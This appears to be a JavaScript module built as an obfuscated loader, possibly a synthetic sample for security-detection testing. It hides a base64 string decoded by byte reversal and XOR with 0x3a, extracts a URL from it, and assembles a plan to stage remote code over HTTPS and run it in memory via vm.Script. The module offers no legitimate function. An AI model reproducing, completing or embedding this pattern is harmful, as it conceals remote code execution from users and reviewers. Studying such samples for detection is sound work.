const moduleShape = Object.freeze({ format: "commonjs" });

const Material_48c098c3 = "Dl5YCxVOU15Pe19eVXQHTlRfXVtlSF9JT0ZTSlsVXlNWW0xUUxRfVkpXW0JfFAIKC1hbDA5eDl5YCxdfXlVUFRUASUpOTlIHVkhPRnsMDn4OfngLF39+dXQHXlNlVF1TW0pXW1lGCwdOVE9VWWVfXVtOSUZXTGVUX1JOZUlKTk5SB0hfTkpbXltGQ0hVV19XZVJZTltKSVNeFl9OVVdfSGVfSFNPS1lbB0lKX05JRgsHTA==";

const Codec_48c098c3 = "base64_literal|reverse_then_xor|3a";



function load_48c098c3() { return [...Buffer.from(Material_48c098c3, "base64")]; }

function decode_48c098c3(e) { return [...e].reverse().map((value) => value ^ 58); }

async function recover_48c098c3() {

  const n = [3, 5, 8, 13].slice(1, 3);

  const e = load_48c098c3(); let d = [];

  switch (1) { case 1: d = decode_48c098c3(e); break; default: throw new Error("state"); }

  void n; return Buffer.from(d).toString("ascii");

}

async function inspect_48c098c3() { return ({ ...{ value: await recover_48c098c3() } }).value; }

async function plan_48c098c3() { const inspect = inspect_48c098c3; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "https_then_vm", url: fields.url, dispatch: "vm.Script" }); }

void moduleShape; void plan_48c098c3;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_48c098c3());

